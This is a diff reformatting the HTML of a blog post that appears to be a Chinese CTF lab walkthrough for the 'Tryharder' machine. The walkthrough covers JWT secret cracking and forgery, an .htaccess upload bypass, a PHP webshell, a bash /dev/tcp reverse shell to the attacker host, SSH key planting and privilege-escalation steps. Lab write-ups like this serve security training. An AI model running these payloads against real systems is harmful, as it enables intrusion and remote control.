@@ -122,7 +122,7 @@ PORT   STATE         SERVICE
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Tryharder.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Tryharder</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -146,17 +146,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -190,22 +180,24 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>1.1 主机发现</h2>
-<p>使用 <code class="notranslate">arp-scan</code> 工具扫描局域网内的存活主机：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>使用 <code>arp-scan</code> 工具扫描局域网内的存活主机：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.138 08:00:27:3E:2A:58       PCS Systemtechnik GmbH
-...</pre></div>
-<p><strong>发现目标主机：</strong> <code class="notranslate">192.168.205.138</code></p>
+...
+</code></pre>
+<p><strong>发现目标主机：</strong> <code>192.168.205.138</code></p>
 <h2>1.2 端口扫描</h2>
 <p>对目标主机进行全端口扫描：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.138
 ...
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-...</pre></div>
+...
+</code></pre>
 <p><strong>开放端口：</strong></p>
 <ul>
 <li>22/tcp - SSH服务</li>
@@ -213,286 +205,314 @@ PORT   STATE SERVICE
 </ul>
 <h2>1.3 UDP端口扫描</h2>
 <p>扫描常用UDP端口，未发现有价值信息：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -sU --top-ports 100 192.168.205.138
 ...
 PORT   STATE         SERVICE
-68/udp open<span class="pl-k">|</span>filtered dhcpc
-...</pre></div>
-<hr>
+68/udp open|filtered dhcpc
+...
+</code></pre>
+<hr />
 <h1>二、Web渗透</h1>
 <h2>2.1 初步信息收集</h2>
-<p>访问 <code class="notranslate">http://192.168.205.138</code>，发现一个"西溪湖科技"公司页面，页面功能主要为锚点跳转。</p>
+<p>访问 <code>http://192.168.205.138</code>，发现一个&quot;西溪湖科技&quot;公司页面，页面功能主要为锚点跳转。</p>
 <p>查看页面源码时发现隐藏的注释信息：</p>
-<div class="highlight highlight-text-html-basic"><pre class="notranslate">/* 调试信息：API路径 /NzQyMjE= */</pre></div>
+<pre lang="html"><code>/* 调试信息：API路径 /NzQyMjE= */
+</code></pre>
 <h2>2.2 Base64解码</h2>
-<p>识别到 <code class="notranslate">NzQyMjE=</code> 为Base64编码，进行解码：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>NzQyMjE=<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d
-74221</pre></div>
-<p>访问解码后的路径 <code class="notranslate">http://192.168.205.138/74221/</code>，发现一个登录页面。</p>
+<p>识别到 <code>NzQyMjE=</code> 为Base64编码，进行解码：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ echo 'NzQyMjE=' | base64 -d
+74221
+</code></pre>
+<p>访问解码后的路径 <code>http://192.168.205.138/74221/</code>，发现一个登录页面。</p>
 <h2>2.3 目录扫描</h2>
-<p>使用 <code class="notranslate">gobuster</code> 对该目录进行扫描：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>使用 <code>gobuster</code> 对该目录进行扫描：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://192.168.205.138/74221/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
 ...
 /index.php            (Status: 200) [Size: 2174]
-/uploads              (Status: 301) [--<span class="pl-k">&gt;</span> http://192.168.205.138/74221/uploads/]
-/dashboard.php        (Status: 302) [Size: 0] [--<span class="pl-k">&gt;</span> index.php]
-...</pre></div>
+/uploads              (Status: 301) [--&gt; http://192.168.205.138/74221/uploads/]
+/dashboard.php        (Status: 302) [Size: 0] [--&gt; index.php]
+...
+</code></pre>
 <p><strong>发现目录：</strong></p>
 <ul>
-<li><code class="notranslate">/uploads</code> - 文件上传目录（存在999子目录，疑似用户ID）</li>
-<li><code class="notranslate">/dashboard.php</code> - 仪表板页面（需要认证）</li>
+<li><code>/uploads</code> - 文件上传目录（存在999子目录，疑似用户ID）</li>
+<li><code>/dashboard.php</code> - 仪表板页面（需要认证）</li>
 </ul>
 <h2>2.4 弱密码爆破</h2>
-<p>基于页面中的关键词 <code class="notranslate">Xiixhu</code>，构造用户名字典进行密码爆破：</p>
+<p>基于页面中的关键词 <code>Xiixhu</code>，构造用户名字典进行密码爆破：</p>
 <p><strong>用户名字典：</strong></p>
-<pre class="notranslate"><code class="notranslate">admin
+<pre><code>admin
 test
 guest
 user
 Xiixhu
 </code></pre>
 <p>使用Burp Suite进行爆破，成功获得凭证：</p>
-<p><strong>凭证：</strong> <code class="notranslate">test:123456</code></p>
-<hr>
+<p><strong>凭证：</strong> <code>test:123456</code></p>
+<hr />
 <h1>三、JWT令牌伪造</h1>
 <h2>3.1 JWT分析</h2>
 <p>登录后抓包发现使用JWT进行身份认证：</p>
-<pre class="notranslate"><code class="notranslate">Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MTM5NDc5MH0.tGdne-jmzu_HPTgoT30sF4SKhN0mD9ogRep0z8pUjnw
+<pre><code>Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MTM5NDc5MH0.tGdne-jmzu_HPTgoT30sF4SKhN0mD9ogRep0z8pUjnw
 </code></pre>
 <p>解码JWT载荷发现：</p>
-<div class="highlight highlight-source-json"><pre class="notranslate">{
-  <span class="pl-ent">"sub"</span>: <span class="pl-s"><span class="pl-pds">"</span>123<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"role"</span>: <span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>,
-  <span class="pl-ent">"exp"</span>: <span class="pl-c1">1761394790</span>
-}</pre></div>
-<p>当前角色为 <code class="notranslate">user</code>，需要提升至 <code class="notranslate">admin</code> 才能获得文件上传权限。</p>
+<pre lang="json"><code>{
+  &quot;sub&quot;: &quot;123&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;exp&quot;: 1761394790
+}
+</code></pre>
+<p>当前角色为 <code>user</code>，需要提升至 <code>admin</code> 才能获得文件上传权限。</p>
 <h2>3.2 JWT密钥爆破</h2>
-<p>使用 <code class="notranslate">jwt_tool</code> 进行密钥爆破：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/jwt_tool]
-└─$ python3 jwt_tool.py -C -d /usr/share/wordlists/seclists/Passwords/scraped-JWT-secrets.txt <span class="pl-s"><span class="pl-pds">'</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...<span class="pl-pds">'</span></span>
+<p>使用 <code>jwt_tool</code> 进行密钥爆破：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/jwt_tool]
+└─$ python3 jwt_tool.py -C -d /usr/share/wordlists/seclists/Passwords/scraped-JWT-secrets.txt 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
 ...
-[+] jwtsecret123 is the CORRECT key<span class="pl-k">!</span>
-...</pre></div>
-<p><strong>成功爆破密钥：</strong> <code class="notranslate">jwtsecret123</code></p>
+[+] jwtsecret123 is the CORRECT key!
+...
+</code></pre>
+<p><strong>成功爆破密钥：</strong> <code>jwtsecret123</code></p>
 <h2>3.3 伪造管理员令牌</h2>
-<p>使用在线JWT工具（如 jwt.io）或命令行工具，将 <code class="notranslate">role</code> 修改为 <code class="notranslate">admin</code>，并且<code class="notranslate">sub</code>改成<code class="notranslate">999</code>：</p>
+<p>使用在线JWT工具（如 jwt.io）或命令行工具，将 <code>role</code> 修改为 <code>admin</code>，并且<code>sub</code>改成<code>999</code>：</p>
 <p><strong>伪造的JWT：</strong></p>
-<pre class="notranslate"><code class="notranslate">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjEzOTQ3OTB9.[签名部分]
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NjEzOTQ3OTB9.[签名部分]
 </code></pre>
 <p>将伪造的JWT替换到Cookie中，成功获得管理员权限。</p>
-<hr>
+<hr />
 <h1>四、文件上传GetShell</h1>
 <h2>4.1 上传限制绕过</h2>
-<p>尝试上传PHP文件时提示只允许 <code class="notranslate">jpg</code> 和 <code class="notranslate">png</code> 格式。测试多种绕过方式：</p>
+<p>尝试上传PHP文件时提示只允许 <code>jpg</code> 和 <code>png</code> 格式。测试多种绕过方式：</p>
 <ul>
 <li><strong>双扩展名（php.jpg）</strong>：可上传但不解析</li>
 <li><strong>.htaccess配合</strong>：成功绕过</li>
 </ul>
 <h3>绕过步骤</h3>
 <p><strong>步骤1：上传 .htaccess 文件</strong></p>
-<p>创建 <code class="notranslate">.htaccess</code> 文件，内容如下：</p>
-<div class="highlight highlight-source-apacheconf"><pre class="notranslate">&lt;<span class="pl-e">IfModule</span> <span class="pl-s">mime_module</span>&gt;
-    <span class="pl-k">SetHandler</span> <span class="pl-e">application/x-httpd-php</span> 
-&lt;/<span class="pl-e">IfModule</span>&gt;</pre></div>
+<p>创建 <code>.htaccess</code> 文件，内容如下：</p>
+<pre lang="apache"><code>&lt;IfModule mime_module&gt;
+    SetHandler application/x-httpd-php 
+&lt;/IfModule&gt;
+</code></pre>
 <p>该配置使当前目录下所有文件都被当作PHP执行。</p>
 <p><strong>步骤2：上传PHP Webshell</strong></p>
-<p>上传 <code class="notranslate">cmd.php</code>：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
-<span class="pl-en">system</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">cmd</span>'</span>]);
-<span class="pl-ent">?&gt;</span></pre></div>
+<p>上传 <code>cmd.php</code>：</p>
+<pre lang="php"><code>&lt;?php
+system($_GET['cmd']);
+?&gt;
+</code></pre>
 <h2>4.2 反弹Shell</h2>
 <p>访问上传的webshell：</p>
-<pre class="notranslate"><code class="notranslate">http://192.168.205.138/74221/uploads/999/cmd.php?cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/4444 0&gt;&amp;1'
+<pre><code>http://192.168.205.138/74221/uploads/999/cmd.php?cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/4444 0&gt;&amp;1'
 </code></pre>
 <p>本地监听端口：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 4444</pre></div>
-<p>成功获得 <code class="notranslate">www-data</code> 权限的Shell。</p>
+<pre lang="bash"><code>nc -lvnp 4444
+</code></pre>
+<p>成功获得 <code>www-data</code> 权限的Shell。</p>
 <h2>4.3 Shell稳定化</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
-<span class="pl-c"><span class="pl-c">#</span> Ctrl+Z</span>
-stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+<pre lang="bash"><code>script /dev/null -c bash
+# Ctrl+Z
+stty raw -echo; fg
 reset xterm
-<span class="pl-k">export</span> TERM=xterm
-<span class="pl-k">export</span> SHELL=/bin/bash
-stty rows 36 columns 178</pre></div>
-<hr>
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 36 columns 178
+</code></pre>
+<hr />
 <h1>五、权限提升</h1>
 <h2>5.1 信息收集</h2>
 <h3>发现隐藏端口</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Tryharder:/home$ ss -tnlp
+<pre lang="bash"><code>www-data@Tryharder:/home$ ss -tnlp
 ...
-LISTEN  0  5  127.0.0.1:8989  0.0.0.0:<span class="pl-k">*</span>
-...</pre></div>
+LISTEN  0  5  127.0.0.1:8989  0.0.0.0:*
+...
+</code></pre>
 <p>发现本地8989端口开放服务。</p>
 <h3>发现关键文件</h3>
-<p>在 <code class="notranslate">/srv</code> 目录下发现两个可疑文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Tryharder:/srv$ ls -al
+<p>在 <code>/srv</code> 目录下发现两个可疑文件：</p>
+<pre lang="bash"><code>www-data@Tryharder:/srv$ ls -al
 ...
 -rw-r--r--  1 root root  161 Mar 23  2025 ...
--rwx------  1 xiix xiix 1012 Mar 23  2025 backdoor.py</pre></div>
+-rwx------  1 xiix xiix 1012 Mar 23  2025 backdoor.py
+</code></pre>
 <h3>发现密码提示</h3>
-<p>在 <code class="notranslate">/home/pentester/.note</code> 中发现提示：</p>
-<pre class="notranslate"><code class="notranslate">Two cities clashed in tale: Smash Caesar, buddy, to pass.
+<p>在 <code>/home/pentester/.note</code> 中发现提示：</p>
+<pre><code>Two cities clashed in tale: Smash Caesar, buddy, to pass.
 </code></pre>
 <p>提示涉及<strong>双城记（A Tale of Two Cities）和凯撒密码</strong>。</p>
 <h2>5.2 密码解密</h2>
 <h3>收集密文</h3>
 <p>从多个位置收集到两段相似文本：</p>
 <p><strong>明文（来自passwd文件的GECOS字段）：</strong></p>
-<pre class="notranslate"><code class="notranslate">Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight...
+<pre><code>Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight...
 </code></pre>
 <p><strong>密文（来自/srv/...文件）：</strong></p>
-<pre class="notranslate"><code class="notranslate">Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
+<pre><code>Iuwbtthfbetuoftimfs&quot;iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
 </code></pre>
 <h3>隐写解密思路</h3>
-<p>对比两段文本，相同字符记为 <code class="notranslate">0</code>，不同字符记为 <code class="notranslate">1</code>，得到二进制序列，每8位转换为ASCII字符：</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">text1</span> <span class="pl-c1">=</span> <span class="pl-s">"Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight..."</span>
-<span class="pl-s1">text2</span> <span class="pl-c1">=</span> <span class="pl-s">"Iuwbtthfbetuoftimfs<span class="pl-cce">\"</span>iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"</span>
+<p>对比两段文本，相同字符记为 <code>0</code>，不同字符记为 <code>1</code>，得到二进制序列，每8位转换为ASCII字符：</p>
+<pre lang="python"><code>text1 = &quot;Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&amp;itwastheseasonofLight...&quot;
+text2 = &quot;Iuwbtthfbetuoftimfs\&quot;iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../&quot;
 
-<span class="pl-s1">binary</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
-<span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-en">min</span>(<span class="pl-en">len</span>(<span class="pl-s1">text1</span>), <span class="pl-en">len</span>(<span class="pl-s1">text2</span>))):
-    <span class="pl-k">if</span> <span class="pl-s1">text1</span>[<span class="pl-s1">i</span>] <span class="pl-c1">==</span> <span class="pl-s1">text2</span>[<span class="pl-s1">i</span>]:
-        <span class="pl-s1">binary</span> <span class="pl-c1">+=</span> <span class="pl-s">"0"</span>
-    <span class="pl-k">else</span>:
-        <span class="pl-s1">binary</span> <span class="pl-c1">+=</span> <span class="pl-s">"1"</span>
+binary = &quot;&quot;
+for i in range(min(len(text1), len(text2))):
+    if text1[i] == text2[i]:
+        binary += &quot;0&quot;
+    else:
+        binary += &quot;1&quot;
 
-<span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
-<span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">0</span>, <span class="pl-en">len</span>(<span class="pl-s1">binary</span>), <span class="pl-c1">8</span>):
-    <span class="pl-s1">byte</span> <span class="pl-c1">=</span> <span class="pl-s1">binary</span>[<span class="pl-s1">i</span>:<span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">8</span>]
-    <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">byte</span>) <span class="pl-c1">==</span> <span class="pl-c1">8</span>:
-        <span class="pl-s1">result</span> <span class="pl-c1">+=</span> <span class="pl-en">chr</span>(<span class="pl-en">int</span>(<span class="pl-s1">byte</span>, <span class="pl-c1">2</span>))
+result = &quot;&quot;
+for i in range(0, len(binary), 8):
+    byte = binary[i:i+8]
+    if len(byte) == 8:
+        result += chr(int(byte, 2))
 
-<span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">result</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
-<p><strong>输出结果：</strong> <code class="notranslate">Y0U_5M4SH3D_17_8UDDY</code></p>
+print(f&quot;{result}&quot;)
+</code></pre>
+<p><strong>输出结果：</strong> <code>Y0U_5M4SH3D_17_8UDDY</code></p>
 <h2>5.3 横向移动至pentester用户</h2>
 <p>使用解密得到的密码：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Tryharder:/home$ su pentester
+<pre lang="bash"><code>www-data@Tryharder:/home$ su pentester
 Password: Y0U_5M4SH3D_17_8UDDY
 pentester@Tryharder:/home$ id
-uid=1000(pentester) gid=1000(pentester) groups=1000(pentester)</pre></div>
+uid=1000(pentester) gid=1000(pentester) groups=1000(pentester)
+</code></pre>
 <h3>检查sudo权限</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pentester@Tryharder:/home$ sudo -l
+<pre lang="bash"><code>pentester@Tryharder:/home$ sudo -l
 ...
 User pentester may run the following commands on tryharder:
-    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/find</pre></div>
+    (ALL : ALL) NOPASSWD: /usr/bin/find
+</code></pre>
 <h3>find命令被篡改</h3>
 <p>尝试常规的sudo提权方式失败：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pentester@Tryharder:/home$ sudo find <span class="pl-c1">.</span> -exec /bin/bash <span class="pl-cce">\;</span> -quit
-find: critical error - Segmentation fault (core dumped)</pre></div>
-<p>经检查，<code class="notranslate">/usr/bin/find</code> 已被替换为自定义的安全版本，禁用了 <code class="notranslate">exec</code>、<code class="notranslate">ok</code>、<code class="notranslate">print</code>、<code class="notranslate">fls</code> 等危险参数（但是他竟然没ban <code class="notranslate">delete </code>，打不进去就毁灭模式😊 ）。</p>
+<pre lang="bash"><code>pentester@Tryharder:/home$ sudo find . -exec /bin/bash \; -quit
+find: critical error - Segmentation fault (core dumped)
+</code></pre>
+<p>经检查，<code>/usr/bin/find</code> 已被替换为自定义的安全版本，禁用了 <code>exec</code>、<code>ok</code>、<code>print</code>、<code>fls</code> 等危险参数（但是他竟然没ban <code>delete </code>，打不进去就毁灭模式😊 ）。</p>
 <p><strong>提权路径暂时受阻，转向其他方向。</strong></p>
 <h2>5.4 横向移动至xiix用户</h2>
 <h3>测试8989端口服务</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pentester@Tryharder:/tmp$ busybox nc 127.0.0.1 8989
+<pre lang="bash"><code>pentester@Tryharder:/tmp$ busybox nc 127.0.0.1 8989
 Enter password: Y0U_5M4SH3D_17_8UDDY
-Access granted<span class="pl-k">!</span>
-shell<span class="pl-k">&gt;</span> id
-uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)</pre></div>
-<p>**成功访问！**密码为之前解密得到的 <code class="notranslate">Y0U_5M4SH3D_17_8UDDY</code>，获得了一个受限shell环境。</p>
+Access granted!
+shell&gt; id
+uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)
+</code></pre>
+<p>**成功访问！**密码为之前解密得到的 <code>Y0U_5M4SH3D_17_8UDDY</code>，获得了一个受限shell环境。</p>
 <h3>写入SSH公钥</h3>
 <p>在受限shell中创建SSH目录并写入公钥：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">shell<span class="pl-k">&gt;</span> <span class="pl-c1">cd</span>
-shell<span class="pl-k">&gt;</span> mkdir .ssh
-shell<span class="pl-k">&gt;</span> <span class="pl-c1">cd</span> .ssh
-shell<span class="pl-k">&gt;</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtNESRfORlUdKO8kWioi3avqR24y4ASUNKAdR2HKASWJQJFzs3nVZbsJjFdxMVSNsOQUZFBxf5PVNyyGOdk7ccN4uAtltAAD2U8HN5GgXxmqqQKptXj9c8aSthRLWpaW3YLIXaMIDzXiRtGtycWNseLjc375ZwL7CHaoa+ZMi/CyooEmdOVvHdTWvueEm7Uj00YRu7KXsB/8xqtP+DMC+c5Dw8xC+XFqTTTsMFsRvvMZ1CIbB+G1YTlWBM9k4MZw+pwBpKDqFMxY1lkfMXuflsRR+PJAqWwJaZ+SQe09ZRDjvjF3IIkYt2uOy1SW9UHHDtnTfODbQyjP2KmTf6FZszCXwq2KiEX79M18MeQsG7XCbCqaytuC3fq4iOWJs0KT5BilrzGWG4g5hIoIQS9omASpsca2WDV9/jhx07vcmN91UsSjqRCr0WH+mQyHz8JnJB66JtZF4MWwQYcl5O7GfdSZl1sQo6jKCMuQW75kNTNMmF6URSGWpOcpKDQd/fdK35PqEA3ibbM+F71B4hmlcTgZBH+u/k8xyDdi886+GyGoAzmDCabEMa7hyRVkkuIgs5ngg9RsvWOlGpLkay1T7q3JZ+3DMLX0sz6eGAwocTJF5D5VoLmp3fzaKdEDE9WBTLn0vXLT8qpzFmtrOvMNB3O25+JS0Liw3vY7YFHvErFQ== kali@kali<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /home/xiix/.ssh/authorized_keys
-shell<span class="pl-k">&gt;</span> <span class="pl-c1">exit</span>
-Goodbye<span class="pl-k">!</span></pre></div>
+<pre lang="bash"><code>shell&gt; cd
+shell&gt; mkdir .ssh
+shell&gt; cd .ssh
+shell&gt; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtNESRfORlUdKO8kWioi3avqR24y4ASUNKAdR2HKASWJQJFzs3nVZbsJjFdxMVSNsOQUZFBxf5PVNyyGOdk7ccN4uAtltAAD2U8HN5GgXxmqqQKptXj9c8aSthRLWpaW3YLIXaMIDzXiRtGtycWNseLjc375ZwL7CHaoa+ZMi/CyooEmdOVvHdTWvueEm7Uj00YRu7KXsB/8xqtP+DMC+c5Dw8xC+XFqTTTsMFsRvvMZ1CIbB+G1YTlWBM9k4MZw+pwBpKDqFMxY1lkfMXuflsRR+PJAqWwJaZ+SQe09ZRDjvjF3IIkYt2uOy1SW9UHHDtnTfODbQyjP2KmTf6FZszCXwq2KiEX79M18MeQsG7XCbCqaytuC3fq4iOWJs0KT5BilrzGWG4g5hIoIQS9omASpsca2WDV9/jhx07vcmN91UsSjqRCr0WH+mQyHz8JnJB66JtZF4MWwQYcl5O7GfdSZl1sQo6jKCMuQW75kNTNMmF6URSGWpOcpKDQd/fdK35PqEA3ibbM+F71B4hmlcTgZBH+u/k8xyDdi886+GyGoAzmDCabEMa7hyRVkkuIgs5ngg9RsvWOlGpLkay1T7q3JZ+3DMLX0sz6eGAwocTJF5D5VoLmp3fzaKdEDE9WBTLn0vXLT8qpzFmtrOvMNB3O25+JS0Liw3vY7YFHvErFQ== kali@kali' &gt; /home/xiix/.ssh/authorized_keys
+shell&gt; exit
+Goodbye!
+</code></pre>
 <h3>SSH登录xiix用户</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh xiix@192.168.205.138
 ...
-xiix@Tryharder:<span class="pl-k">~</span>$ id
-uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)</pre></div>
+xiix@Tryharder:~$ id
+uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)
+</code></pre>
 <p><strong>成功获得xiix用户的完整shell！</strong></p>
 <h2>5.5 猜数字游戏分析</h2>
 <p>在xiix用户家目录发现一个二进制程序：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:<span class="pl-k">~</span>$ ls -al
+<pre lang="bash"><code>xiix@Tryharder:~$ ls -al
 ...
 ---x------ 1 xiix xiix 17584 Mar 25  2025 guess_game
-...</pre></div>
+...
+</code></pre>
 <h3>程序功能</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:<span class="pl-k">~</span>$ ./guess_game
+<pre lang="bash"><code>xiix@Tryharder:~$ ./guess_game
 ===== 终极运气挑战 / Ultimate Luck Challenge ====
 规则很简单： 我心里有个数字（0-99），你有一次机会猜。
 I have a number (0-99), you get one guess.
 猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
-Guess right, I<span class="pl-s"><span class="pl-pds">'</span>ll give your reward; wrong? Hehe, face the consequences!</span>
-<span class="pl-s">提示： 聪明人也许能找到捷径。</span>
-<span class="pl-s">Hint: Smart ones might find a shortcut.</span>
-<span class="pl-s">输入你的猜测（0-99） / Your guess (0-99): 50</span>
-<span class="pl-s">哈哈，猜错了！ / Wrong guess!</span>
-<span class="pl-s">秘密数字是 51。 / Secret number: 51</span>
-<span class="pl-s">正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)</span></pre></div>
-<p>这是一个猜数字游戏，需要猜中0-99之间的随机数。根据提示"聪明人也许能找到捷径"，可以采用<strong>暴力循环</strong>的方式：</p>
+Guess right, I'll give your reward; wrong? Hehe, face the consequences!
+提示： 聪明人也许能找到捷径。
+Hint: Smart ones might find a shortcut.
+输入你的猜测（0-99） / Your guess (0-99): 50
+哈哈，猜错了！ / Wrong guess!
+秘密数字是 51。 / Secret number: 51
+正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)
+</code></pre>
+<p>这是一个猜数字游戏，需要猜中0-99之间的随机数。根据提示&quot;聪明人也许能找到捷径&quot;，可以采用<strong>暴力循环</strong>的方式：</p>
 <h3>暴力破解</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:<span class="pl-k">~</span>$ <span class="pl-k">while</span> <span class="pl-c1">true</span><span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> 25 <span class="pl-k">|</span> ./guess_game<span class="pl-k">;</span> <span class="pl-k">done</span>
+<pre lang="bash"><code>xiix@Tryharder:~$ while true; do echo 25 | ./guess_game; done
 ...
-天哪！你居然猜对了！运气逆天啊！ / You got it<span class="pl-k">!</span> Amazing luck<span class="pl-k">!</span>
+天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!
 Pass: superxiix
-...</pre></div>
-<p><strong>获得密码：</strong> <code class="notranslate">superxiix</code></p>
+...
+</code></pre>
+<p><strong>获得密码：</strong> <code>superxiix</code></p>
 <h2>5.6 LD_PRELOAD提权</h2>
 <h3>检查sudo权限</h3>
